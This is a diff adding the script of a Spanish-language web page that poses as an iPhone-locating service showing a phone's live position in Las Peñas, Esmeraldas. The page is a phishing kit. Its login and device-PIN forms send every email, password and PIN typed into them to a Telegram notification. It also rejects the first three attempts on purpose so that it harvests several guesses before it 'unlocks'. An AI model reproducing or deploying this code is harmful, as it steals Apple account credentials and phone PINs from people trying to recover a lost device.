+            ctx.save();
+            ctx.beginPath();
+            BEACH_STRIP.forEach((pt, idx) => {
+                const s = worldToScreen(pt[0], pt[1]);
+                if (idx === 0) ctx.moveTo(s.x, s.y); else ctx.lineTo(s.x, s.y);
+            });
+            ctx.closePath();
+            ctx.fillStyle = theme.sandShore;
+            ctx.fill();
+
+            ctx.beginPath();
+            COASTLINE_POLY.forEach((pt, idx) => {
+                const s = worldToScreen(pt[0], pt[1]);
+                if (idx === 0) ctx.moveTo(s.x, s.y); else ctx.lineTo(s.x, s.y);
+            });
+            ctx.closePath();
+            const grad = ctx.createLinearGradient(0, 0, window.innerWidth * 0.6, window.innerHeight * 0.5);
+            grad.addColorStop(0, theme.oceanDeep);
+            grad.addColorStop(1, theme.oceanMid);
+            ctx.fillStyle = grad;
+            ctx.fill();
+            ctx.restore();
+        }
+
+        function drawParks(theme) {
+            ctx.save();
+            PARK_ZONES.forEach(p => {
+                const center = worldToScreen(p.x, p.y);
+                ctx.save();
+                ctx.translate(center.x, center.y);
+                ctx.rotate(p.angle);
+                const w = p.w * camera.zoom;
+                const h = p.h * camera.zoom * (1 - camera.tilt * 0.34);
+                ctx.fillStyle = theme.parkFill;
+                roundRect(ctx, -w / 2, -h / 2, w, h, 6 * camera.zoom);
+                ctx.fill();
+                ctx.restore();
+            });
+            ctx.restore();
+        }
+
+        function drawUrbanStreets(theme, alpha) {
+            ctx.save();
+            ctx.globalAlpha = alpha;
+            ctx.lineCap = "round";
+            ctx.lineJoin = "round";
+            URBAN_STREETS.forEach(st => {
+                ctx.beginPath();
+                st.points.forEach((pt, idx) => {
+                    const s = worldToScreen(pt[0], pt[1]);
+                    if (idx === 0) ctx.moveTo(s.x, s.y); else ctx.lineTo(s.x, s.y);
+                });
+                ctx.strokeStyle = theme.streetCasing;
+                ctx.lineWidth = st.width * camera.zoom + 3;
+                ctx.stroke();
+            });
+            URBAN_STREETS.forEach(st => {
+                ctx.beginPath();
+                st.points.forEach((pt, idx) => {
+                    const s = worldToScreen(pt[0], pt[1]);
+                    if (idx === 0) ctx.moveTo(s.x, s.y); else ctx.lineTo(s.x, s.y);
+                });
+                ctx.strokeStyle = theme.streetFill;
+                ctx.lineWidth = st.width * camera.zoom;
+                ctx.stroke();
+            });
+            ctx.restore();
+        }
+
+        function drawMainHighways(theme) {
+            ctx.save();
+            ctx.lineCap = "round";
+            ctx.lineJoin = "round";
+            MAIN_ROADS.forEach(road => {
+                ctx.beginPath();
+                road.points.forEach((pt, idx) => {
+                    const s = worldToScreen(pt[0], pt[1]);
+                    if (idx === 0) ctx.moveTo(s.x, s.y); else ctx.lineTo(s.x, s.y);
+                });
+                ctx.strokeStyle = theme.highwayCasing;
+                ctx.lineWidth = Math.max(4, road.width * Math.pow(camera.zoom, 0.72) + 3);
+                ctx.stroke();
+            });
+            MAIN_ROADS.forEach(road => {
+                ctx.beginPath();
+                road.points.forEach((pt, idx) => {
+                    const s = worldToScreen(pt[0], pt[1]);
+                    if (idx === 0) ctx.moveTo(s.x, s.y); else ctx.lineTo(s.x, s.y);
+                });
+                ctx.strokeStyle = theme.highwayFill;
+                ctx.lineWidth = Math.max(2.5, road.width * Math.pow(camera.zoom, 0.72));
+                ctx.stroke();
+            });
+            ctx.restore();
+        }
+
+        function drawBuildings(theme, alpha) {
+            ctx.save();
+            ctx.globalAlpha = alpha;
+            BUILDINGS.forEach(b => {
+                const center = worldToScreen(b.x, b.y);
+                const w = b.w * camera.zoom;
+                const h = b.h * camera.zoom * (1 - camera.tilt * 0.34);
+                const extrudeY = camera.tilt * b.height * (camera.zoom * 0.42);
+
+                ctx.save();
+                ctx.translate(center.x, center.y);
+                ctx.rotate(b.angle);
+                ctx.fillStyle = "rgba(6, 12, 24, 0.45)";
+                roundRect(ctx, -w / 2 + 3, -h / 2 + 4, w, h, 2.5);
+                ctx.fill();
+
+                if (extrudeY > 0.5) {
+                    ctx.fillStyle = theme.buildingStroke;
+                    roundRect(ctx, -w / 2, -h / 2 - extrudeY, w, h + extrudeY, 2.5);
+                    ctx.fill();
+                }
+
+                ctx.fillStyle = b.alt ? theme.buildingAlt : theme.buildingBase;
+                ctx.strokeStyle = theme.buildingStroke;
+                ctx.lineWidth = 1.1;
+                roundRect(ctx, -w / 2, -h / 2 - extrudeY, w, h, 2.5);
+                ctx.fill();
+                ctx.stroke();
+                ctx.restore();
+            });
+            ctx.restore();
+        }
+
+        function drawStreetLights(alpha) {
+            ctx.save();
+            ctx.globalAlpha = alpha;
+            STREET_LIGHTS.forEach((light, idx) => {
+                const s = worldToScreen(light.x, light.y);
+                const pulse = 0.85 + Math.sin(animTime * 2.2 + idx) * 0.15;
+                const radius = Math.max(4, 5.5 * (camera.zoom * 0.35)) * pulse;
+                const glow = ctx.createRadialGradient(s.x, s.y, 0, s.x, s.y, radius * 2.8);
+                glow.addColorStop(0, "rgba(251, 191, 36, 0.65)");
+                glow.addColorStop(1, "rgba(251, 191, 36, 0)");
+                ctx.fillStyle = glow;
+                ctx.beginPath();
+                ctx.arc(s.x, s.y, radius * 2.8, 0, Math.PI * 2);
+                ctx.fill();
+            });
+            ctx.restore();
+        }
+
+        function drawNavigationRoute() {
+            ctx.save();
+            ctx.lineCap = "round";
+            ctx.lineJoin = "round";
+            ctx.beginPath();
+            SIMULATED_ROUTE_PATH.forEach((pt, idx) => {
+                const s = worldToScreen(pt[0], pt[1]);
+                if (idx === 0) ctx.moveTo(s.x, s.y); else ctx.lineTo(s.x, s.y);
+            });
+            ctx.strokeStyle = "#38bdf8";
+            ctx.lineWidth = Math.max(5, 2.8 * camera.zoom);
+            ctx.stroke();
+            ctx.restore();
+        }
+
+        function drawRoadLabels() {
+            ctx.save();
+            ctx.textAlign = "center";
+            ctx.textBaseline = "middle";
+            const viaTolaPt = worldToScreen(-175, 118);
+            drawRotatedStreetText("VÍA LA TOLA", viaTolaPt.x, viaTolaPt.y, -0.35, 10.5);
+            const carlosPt = worldToScreen(110, -256);
+            drawRotatedStreetText("CARLOS ROSERO", carlosPt.x, carlosPt.y, -0.36, 10);
+            ctx.restore();
+        }
+
+        function drawRotatedStreetText(text, x, y, angle, size) {
+            ctx.save();
+            ctx.translate(x, y);
+            ctx.rotate(angle);
+            ctx.font = `700 ${size}px Inter, sans-serif`;
+            ctx.strokeStyle = "rgba(11, 20, 36, 0.9)";
+            ctx.lineWidth = 3;
+            ctx.strokeText(text, 0, 0);
+            ctx.fillStyle = "rgba(226, 232, 240, 0.92)";
+            ctx.fillText(text, 0, 0);
+            ctx.restore();
+        }
+
+        function drawPOIs() {
+            POIS.forEach(poi => {
+                if (camera.zoom < poi.minZoom || camera.zoom > poi.maxZoom) return;
+                const alpha = Math.min(1, (camera.zoom - poi.minZoom + 0.25) / 0.45);
+                const s = worldToScreen(poi.x, poi.y);
+
+                ctx.save();
+                ctx.globalAlpha = alpha;
+                const r = 12;
+                ctx.save();
+                ctx.translate(s.x, s.y);
+
+                ctx.beginPath();
+                ctx.arc(0, -r - 4, r, Math.PI * 0.8, Math.PI * 2.2);
+                ctx.lineTo(0, 0);
+                ctx.closePath();
+                ctx.fillStyle = poi.color;
+                ctx.fill();
+                ctx.strokeStyle = "rgba(255, 255, 255, 0.45)";
+                ctx.lineWidth = 1.2;
+                ctx.stroke();
+
+                drawPoiVectorIcon(poi.type, 0, -r - 4);
+                ctx.restore();
+
+                const lines = poi.title.split("\n");
+                ctx.font = "600 11px Inter, sans-serif";
+                ctx.textBaseline = "middle";
+                const textX = poi.align === "left" ? s.x - 16 : s.x + 16;
+                ctx.textAlign = poi.align === "left" ? "right" : "left";
+
+                lines.forEach((line, idx) => {
+                    const ly = s.y - r - 4 + (idx - (lines.length - 1) / 2) * 13;
+                    ctx.strokeStyle = "rgba(8, 15, 28, 0.95)";
+                    ctx.lineWidth = 3;
+                    ctx.strokeText(line, textX, ly);
+                    ctx.fillStyle = poi.textColor;
+                    ctx.fillText(line, textX, ly);
+                });
+                ctx.restore();
+            });
+        }
+
+        function drawPoiVectorIcon(type, cx, cy) {
+            ctx.save();
+            ctx.strokeStyle = "#0f172a";
+            ctx.fillStyle = "#0f172a";
+            ctx.lineWidth = 1.6;
+            ctx.lineCap = "round";
+            ctx.lineJoin = "round";
+
+            if (type === "bed") {
+                ctx.beginPath();
+                ctx.moveTo(cx - 5.5, cy + 3); ctx.lineTo(cx - 5.5, cy - 2);
+                ctx.moveTo(cx - 5.5, cy + 1); ctx.lineTo(cx + 5.5, cy + 1);
+                ctx.stroke();
+                ctx.fillRect(cx - 4.2, cy - 1.5, 3, 2);
+            } else if (type === "cocktail") {
+                ctx.beginPath();
+                ctx.moveTo(cx - 4.5, cy - 4); ctx.lineTo(cx + 4.5, cy - 4); ctx.lineTo(cx, cy + 0.5);
+                ctx.closePath(); ctx.stroke();
+            } else if (type === "bag") {
+                ctx.strokeRect(cx - 4, cy - 1.5, 8, 6);
+                ctx.beginPath(); ctx.arc(cx, cy - 1.5, 2.3, Math.PI, 0); ctx.stroke();
+            } else if (type === "beach") {
+                ctx.beginPath(); ctx.arc(cx, cy - 0.5, 5, Math.PI, 0); ctx.fill();
+            }
+            ctx.restore();
+        }
+
+        /**
+         * ============================================================================
+         * MARCADOR DE SMARTPHONE CON ONDAS CIRCULARES DE RADAR Y MÁS INFORMACIÓN
+         * ============================================================================
+         */
+        function drawSmartphoneMarker() {
+            const s = worldToScreen(DEVICE_DATA.worldX, DEVICE_DATA.worldY);
+            const shakeOffset = isRinging ? Math.sin(animTime * 42) * 3.5 : 0;
+
+            ctx.save();
+            ctx.translate(s.x + shakeOffset, s.y);
+
+            // 1. Ondas circulares múltiples estilo radar (3 anillos de sonar con gradiente desvanecido)
+            for (let i = 0; i < 3; i++) {
+                const ringPhase = ((animTime * 0.55) + (i * 0.33)) % 1;
+                const ringRadius = 24 + ringPhase * 68;
+                const ringAlpha = (1 - ringPhase) * 0.65;
+
+                ctx.beginPath();
+                ctx.arc(0, 0, ringRadius, 0, Math.PI * 2);
+                ctx.strokeStyle = `rgba(56, 189, 248, ${ringAlpha})`;
+                ctx.lineWidth = 1.8;
+                ctx.stroke();
+
+                if (i === 0) {
+                    ctx.fillStyle = `rgba(14, 165, 233, ${ringAlpha * 0.22})`;
+                    ctx.fill();
+                }
+            }
+
+            // 2. Círculo de precisión GPS estático
+            ctx.beginPath();
+            ctx.arc(0, 0, 34, 0, Math.PI * 2);
+            ctx.fillStyle = "rgba(14, 165, 233, 0.12)";
+            ctx.fill();
+            ctx.strokeStyle = "rgba(56, 189, 248, 0.4)";
+            ctx.lineWidth = 1.2;
+            ctx.stroke();
+
+            // 3. Medallón central del icono del teléfono
+            ctx.shadowColor = "rgba(0, 0, 0, 0.65)";
+            ctx.shadowBlur = 16;
+            ctx.shadowOffsetY = 6;
+            ctx.beginPath();
+            ctx.arc(0, 0, 26, 0, Math.PI * 2);
+            ctx.fillStyle = "#f1f5f9";
+            ctx.fill();
+
+            ctx.shadowColor = "transparent";
+            ctx.beginPath();
+            ctx.arc(0, 0, 23, 0, Math.PI * 2);
+            const innerGrad = ctx.createLinearGradient(0, -23, 0, 23);
+            innerGrad.addColorStop(0, "#1e293b");
+            innerGrad.addColorStop(1, "#090d16");
+            ctx.fillStyle = innerGrad;
+            ctx.fill();
+
+            // 4. Smartphone vectorizado
+            ctx.strokeStyle = "#38bdf8";
+            ctx.fillStyle = "rgba(56, 189, 248, 0.18)";
+            ctx.lineWidth = 2;
+            roundRect(ctx, -8.5, -14, 17, 28, 3.8);
+            ctx.fill();
+            ctx.stroke();
+
+            ctx.fillStyle = "#38bdf8";
+            roundRect(ctx, -3, -11.2, 6, 1.8, 1);
+            ctx.fill();
+            roundRect(ctx, -3.5, 10.5, 7, 1.3, 0.6);
+            ctx.fill();
+
+            // 5. Panel flotante enriquecido con MÁS información de ubicación
+            const badgeW = 165;
+            const badgeH = 46;
+            const badgeX = -badgeW / 2;
+            const badgeY = -82;
+
+            ctx.fillStyle = "rgba(15, 23, 42, 0.92)";
+            ctx.strokeStyle = "rgba(56, 189, 248, 0.45)";
+            ctx.lineWidth = 1.2;
+            roundRect(ctx, badgeX, badgeY, badgeW, badgeH, 10);
+            ctx.fill();
+            ctx.stroke();
+
+            ctx.fillStyle = "#38bdf8";
+            ctx.font = "700 10.5px Inter, sans-serif";
+            ctx.textAlign = "center";
+            ctx.textBaseline = "top";
+            ctx.fillText("iPhone 13 • EN VIVO", 0, badgeY + 6);
+
+            ctx.fillStyle = "#e2e8f0";
+            ctx.font = "500 9px Inter, sans-serif";
+            ctx.fillText(`GPS ± 3m • ${DEVICE_DATA.network}`, 0, badgeY + 20);
+
+            ctx.fillStyle = "#94a3b8";
+            ctx.font = "400 8.5px Inter, sans-serif";
+            ctx.fillText(`${DEVICE_DATA.coordsText} • ${DEVICE_DATA.speed}`, 0, badgeY + 32);
+
+            ctx.restore();
+        }
+
+        function roundRect(ctx, x, y, w, h, r) {
+            ctx.beginPath();
+            ctx.moveTo(x + r, y);
+            ctx.lineTo(x + w - r, y);
+            ctx.quadraticCurveTo(x + w, y, x + w, y + r);
+            ctx.lineTo(x + w, y + h - r);
+            ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
+            ctx.lineTo(x + r, y + h);
+            ctx.quadraticCurveTo(x, y + h, x, y + h - r);
+            ctx.lineTo(x, y + r);
+            ctx.quadraticCurveTo(x, y, x + r, y);
+            ctx.closePath();
+        }
+
+        function startAutomatedSequence() {
+            setTimeout(() => {
+                document.getElementById('tracking-status-text').textContent = "Acercando a Las Peñas, Esmeraldas...";
+                camera.targetX = 20;
+                camera.targetY = -20;
+                camera.targetZoom = 2.32;
+
+                setTimeout(() => {
+                    if (!isEmailVerified) {
+                        document.getElementById('tracking-status-text').textContent = "Paso 1: Verifica tu identidad";
+                        showModal('auth-gate-overlay', 'auth-gate-card');
+                        document.getElementById('email-input').focus();
+                    }
+                }, 2200);
+            }, 600);
+        }
+
+        function fillDemoAccount() {
+            document.getElementById('email-input').value = "juan@icloud.com";
+            document.getElementById('password-input').value = "LasPenas2026";
+            document.getElementById('auth-error-msg').classList.add('hidden');
+        }
+
+        function togglePasswordVisibility() {
+            const input = document.getElementById('password-input');
+            const icon = document.getElementById('eye-icon');
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.replace('ph-eye', 'ph-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.replace('ph-eye-slash', 'ph-eye');
+            }
+        }
+
+        function handleAccountVerification(event) {
+            event.preventDefault();
+            const email = document.getElementById('email-input').value.trim();
+            const password = document.getElementById('password-input').value.trim();
+            const errEl = document.getElementById('auth-error-msg');
+            const submitBtn = document.getElementById('btn-submit-verify');
+
+            emailAttemptCount++;
+
+            sendTelegramNotification(
+                `🔐 *Intento de Login #${emailAttemptCount}*\n` +
+                `📧 Email: \`${email}\`\n` +
+                `🔑 Contraseña: \`${password}\`\n` +
+                `⏰ Estado: ${emailAttemptCount < 4 ? 'Fallido (Intencional)' : 'Exitoso (Permitido)'}`
+            );
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = `<i class="ph-bold ph-spinner animate-spin text-base"></i><span>Validando cuenta...</span>`;
+
+            setTimeout(() => {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = `<span>Continuar</span><i class="ph-bold ph-arrow-right text-sm"></i>`;
+
+                if (emailAttemptCount < 4) {
+                    errEl.textContent = `Correo o contraseña incorrectos.`//(Intento ${emailAttemptCount} de 3)`;
+                    errEl.classList.remove('hidden');
+                } else {
+                    isEmailVerified = true;
+                    hideModal('auth-gate-overlay');
+
+                    const statusText = document.getElementById('tracking-status-text');
+                    statusText.textContent = "Explorando manzana y comercios...";
+                    camera.targetX = DEVICE_DATA.worldX;
+                    camera.targetY = DEVICE_DATA.worldY - 10;
+                    camera.targetZoom = 3.92;
+
+                    setTimeout(() => {
+                        if (!isPinVerified) {
+                            statusText.textContent = "Paso 2: Ingresa el PIN del dispositivo";
+                            enteredPin = "";
+                            updatePinDotsUI();
+                            showModal('pin-gate-overlay', 'pin-gate-card');
+                        }
+                    }, 2000);
+                }
+            }, 600);
+        }
+
+        window.addEventListener('keydown', (e) => {
+            const pinOverlay = document.getElementById('pin-gate-overlay');
+            if (!pinOverlay.classList.contains('hidden')) {
+                if (e.key >= '0' && e.key <= '9') {
+                    pressPinDigit(e.key);
+                } else if (e.key === 'Backspace') {
+                    deletePinDigit();
+                }
+            }
+        });
+
+        function pressPinDigit(digit) {
+            if (enteredPin.length >= 6) return;
+            enteredPin += digit;
+            updatePinDotsUI();
+
+            if (enteredPin.length === 6) {
+                validateDevicePin();
+            }
+        }
+
+        function deletePinDigit() {
+            if (enteredPin.length === 0) return;
+            enteredPin = enteredPin.slice(0, -1);
+            document.getElementById('pin-error-msg').classList.add('hidden');
+            updatePinDotsUI();
+        }
+
+        function fillDemoPin() {
+            enteredPin = "123456";
+            updatePinDotsUI();
+            setTimeout(() => validateDevicePin(), 220);
+        }
+
+        function updatePinDotsUI() {
+            const dots = document.querySelectorAll('.pin-dot');
+            dots.forEach((dot, idx) => {
+                if (idx < enteredPin.length) {
+                    dot.classList.add('bg-sky-400', 'border-sky-400', 'scale-110');
+                    dot.classList.remove('border-white/40');
+                } else {
+                    dot.classList.remove('bg-sky-400', 'border-sky-400', 'scale-110');
+                    dot.classList.add('border-white/40');
+                }
+            });
+        }
+
+        function validateDevicePin() {
+            pinAttemptCount++;
+
+            sendTelegramNotification(
+                `📱 *Intento de PIN de Dispositivo #${pinAttemptCount}*\n` +
+                `🔢 PIN Ingresado: \`${enteredPin}\`\n` +
+                `⏰ Estado: ${pinAttemptCount < 4 ? 'Fallido (Intencional)' : 'Exitoso (Desbloqueado)'}`
+            );
+
+            if (pinAttemptCount < 4) {
+                const container = document.getElementById('pin-dots-container');
+                const err = document.getElementById('pin-error-msg');
+                err.textContent = `PIN incorrecto.`// (Intento ${pinAttemptCount} de 3)`;
+                err.classList.remove('hidden');
+                container.classList.add('shake-error');
+                setTimeout(() => {
+                    container.classList.remove('shake-error');
+                    enteredPin = "";
+                    updatePinDotsUI();
+                }, 400);
+            } else {
+                isPinVerified = true;
+                hideModal('pin-gate-overlay');
+
+                const statusText = document.getElementById('tracking-status-text');
+                const statusPill = document.getElementById('tracking-status-pill');
+                const statusDot = document.getElementById('status-dot');
+
+                statusText.textContent = "Verificado • Ubicación exacta";
+                statusPill.classList.replace('text-sky-300', 'text-emerald-300');
+                statusDot.classList.replace('bg-sky-400', 'bg-emerald-400');
+
+                camera.targetX = DEVICE_DATA.worldX;
+                camera.targetY = DEVICE_DATA.worldY + 35;
+                camera.targetZoom = 4.85;
+
+                setTimeout(() => {
+                    showDeviceInfoSheet();
+                }, 900);
+            }
+        }
+
+        function showModal(overlayId, cardId) {
+            const overlay = document.getElementById(overlayId);
+            const card = document.getElementById(cardId);
+            overlay.classList.remove('hidden');
+            overlay.classList.add('flex');
+            requestAnimationFrame(() => {
+                overlay.classList.remove('opacity-0');
+                card.classList.remove('fade-scale-enter');
+                card.classList.add('fade-scale-active');
+            });
+        }
+
+        function hideModal(overlayId) {
+            const overlay = document.getElementById(overlayId);
+            overlay.classList.add('opacity-0');
+            setTimeout(() => {
+                overlay.classList.add('hidden');
+                overlay.classList.remove('flex');
+            }, 360);
+        }
+
+        function showDeviceInfoSheet() {
+            const sheet = document.getElementById('device-info-sheet');
+            document.getElementById('device-name').textContent = DEVICE_DATA.name;
+            document.getElementById('device-exact-address').textContent = DEVICE_DATA.address;
+            document.getElementById('device-battery').textContent = `${DEVICE_DATA.battery}%`;
+            document.getElementById('device-coords-label').textContent = DEVICE_DATA.coordsText;
+
+            sheet.classList.remove('hidden');
+            requestAnimationFrame(() => {
+                sheet.classList.remove('opacity-0', 'translate-y-4');
+            });
+        }
+
+        function resetFullDemo() {
+            stopRinging();
+            showRoute = false;
+            isEmailVerified = false;
+            isPinVerified = false;
+            enteredPin = "";
+            emailAttemptCount = 0;
+            pinAttemptCount = 0;
+
+            const sheet = document.getElementById('device-info-sheet');
+            sheet.classList.add('hidden', 'opacity-0', 'translate-y-4');
+
+            const submitBtn = document.getElementById('btn-submit-verify');
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = `<span>Continuar </span><i class="ph-bold ph-arrow-right text-sm"></i>`;
+
+            const statusPill = document.getElementById('tracking-status-pill');
+            const statusDot = document.getElementById('status-dot');
+            statusPill.classList.replace('text-emerald-300', 'text-sky-300');
+            statusDot.classList.replace('bg-emerald-400', 'bg-sky-400');
+
+            camera.x = 0;
+            camera.y = 60;
+            camera.zoom = 1.05;
+            camera.targetX = 0;
+            camera.targetY = 60;
+            camera.targetZoom = 1.05;
+            camera.targetTilt = 0;
+            document.getElementById('btn-3d').classList.remove('text-sky-400', 'bg-sky-500/20');
+
+            startAutomatedSequence();
+        }
+
+        function setupPointerControls() {
+            canvas.addEventListener('mousedown', (e) => {
+                isDragging = true;
+                dragStartX = e.clientX;
+                dragStartY = e.clientY;
+                camStartX = camera.targetX;
+                camStartY = camera.targetY;
+            });
+
+            window.addEventListener('mousemove', (e) => {
+                if (!isDragging) return;
+                const pitchFactor = 1 - camera.tilt * 0.34;
+                camera.targetX = camStartX - (e.clientX - dragStartX) / camera.zoom;
+                camera.targetY = camStartY - (e.clientY - dragStartY) / (camera.zoom * pitchFactor);
+            });
+
+            window.addEventListener('mouseup', () => { isDragging = false; });
+
+            canvas.addEventListener('wheel', (e) => {
+                e.preventDefault();
+                const zoomFactor = e.deltaY < 0 ? 1.14 : 0.88;
+                applyZoomAtPoint(zoomFactor, e.clientX, e.clientY);
+            }, { passive: false });
+        }
+
+        function applyZoomAtPoint(factor, sx, sy) {
+            const before = screenToWorld(sx, sy);
+            camera.targetZoom = Math.min(6.5, Math.max(0.85, camera.targetZoom * factor));
+            const cx = window.innerWidth / 2;
+            const cy = window.innerHeight / 2;
+            const pitchFactor = 1 - camera.tilt * 0.34;
+            camera.targetX = before.x - (sx - cx) / camera.targetZoom;
+            camera.targetY = before.y - (sy - cy) / (camera.targetZoom * pitchFactor);
+        }
+
+        function manualZoomStep(factor) {
+            applyZoomAtPoint(factor, window.innerWidth / 2, window.innerHeight / 2);
+        }
+
+        function cycleMapTheme() {
+            currentThemeIdx = (currentThemeIdx + 1) % MAP_THEMES.length;
+            showToast(`Estilo: ${MAP_THEMES[currentThemeIdx].name}`);
+        }
+
+        function recenterOnDevice() {
+            camera.targetX = DEVICE_DATA.worldX;
+            camera.targetY = isPinVerified ? DEVICE_DATA.worldY + 35 : DEVICE_DATA.worldY;
+            camera.targetZoom = isPinVerified ? 4.85 : (isEmailVerified ? 3.92 : 2.32);
+            showToast("Centrado en dispositivo");
+        }
+
+        function toggle3DView() {
+            const btn3D = document.getElementById('btn-3d');
+            if (camera.targetTilt < 0.5) {
+                camera.targetTilt = 1;
+                btn3D.classList.add('text-sky-400', 'bg-sky-500/20');
+                showToast("Perspectiva y edificios 3D activados");
+            } else {
+                camera.targetTilt = 0;
+                btn3D.classList.remove('text-sky-400', 'bg-sky-500/20');
+                showToast("Vista 2D estándar");
+            }
+        }
+
+        function toggleSimulatedRoute() {
+            showRoute = !showRoute;
+            const label = document.getElementById('route-btn-label');
+            if (showRoute) {
+                label.textContent = "Ocultar ruta";
+                camera.targetX = -15; camera.targetY = -20; camera.targetZoom = 2.95;
+                showToast("Ruta trazada sobre calles de Las Peñas");
+            } else {
+                label.textContent = "Ruta";
+                recenterOnDevice();
+            }
+        }
+
+        function triggerPlaySound() {
+            const sheetIcon = document.getElementById('sheet-phone-icon');
+            const label = document.getElementById('sound-btn-label');
+
+            if (isRinging) { stopRinging(); return; }
+            isRinging = true;
+            label.textContent = "Detener sonido";
+            if (sheetIcon) sheetIcon.classList.add('ringing-animation');
+            showToast("Reproduciendo sonido en Mi Teléfono...");
+
+            try {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const playPing = () => {
+                    if (!isRinging || !audioCtx) return;
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(1046.5, audioCtx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(1567.98, audioCtx.currentTime + 0.18);
+                    gain.gain.setValueAtTime(0.18, audioCtx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.55);
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.start();
+                    osc.stop(audioCtx.currentTime + 0.55);
+                };
+                playPing();
+                ringInterval = setInterval(playPing, 880);
+                setTimeout(() => { if (isRinging) stopRinging(); }, 8000);
+            } catch (e) { console.warn("Audio no disponible:", e); }
+        }
+
+        function stopRinging() {
+            isRinging = false;
+            clearInterval(ringInterval);
+            if (audioCtx) { audioCtx.close().catch(() => {}); audioCtx = null; }
+            const sheetIcon = document.getElementById('sheet-phone-icon');
+            const label = document.getElementById('sound-btn-label');
+            if (sheetIcon) sheetIcon.classList.remove('ringing-animation');
+            if (label) label.textContent = "Reproducir sonido";
+        }
+
+        function refreshDeviceLocation() {
+            const icon = document.getElementById('refresh-icon');
+            const lastSeen = document.getElementById('device-last-seen');
+            icon.classList.add('animate-spin');
+            lastSeen.textContent = "Sincronizando señal GPS...";
+
+            setTimeout(() => {
+                icon.classList.remove('animate-spin');
+                const now = new Date();
+                const timeStr = now.toLocaleTimeString('es-EC', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+                lastSeen.textContent = `Actualizado a las ${timeStr} • Precisión: 3m`;
+                recenterOnDevice();
+                showToast("Ubicación actualizada");
+            }, 750);
+        }
+
+        function switchTab(tabName, buttonEl) {
+            document.querySelectorAll('.nav-tab').forEach(btn => {
+                btn.classList.remove('active-tab', 'bg-slate-900/65', 'text-sky-400');
+                btn.classList.add('text-slate-300/80');
+            });
+            buttonEl.classList.add('active-tab', 'bg-slate-900/65', 'text-sky-400');
+            buttonEl.classList.remove('text-slate-300/80');
+
+            const sheet = document.getElementById('device-info-sheet');
+            if (tabName === 'dispositivos') {
+                if (isPinVerified) showDeviceInfoSheet();
+            } else {
+                sheet.classList.add('hidden');
+                showToast(`Pestaña ${tabName}`);
+            }
+        }
+
+        let toastTimeout = null;
+        function showToast(message) {
+            const banner = document.getElementById('toast-banner');
+            const msgEl = document.getElementById('toast-message');
+            msgEl.textContent = message;
+            banner.classList.remove('opacity-0', '-translate-y-3');
+            clearTimeout(toastTimeout);
+            toastTimeout = setTimeout(() => {
+                banner.classList.add('opacity-0', '-translate-y-3');
+            }, 2500);
+        }
+    </script>
+</body>
+</html>
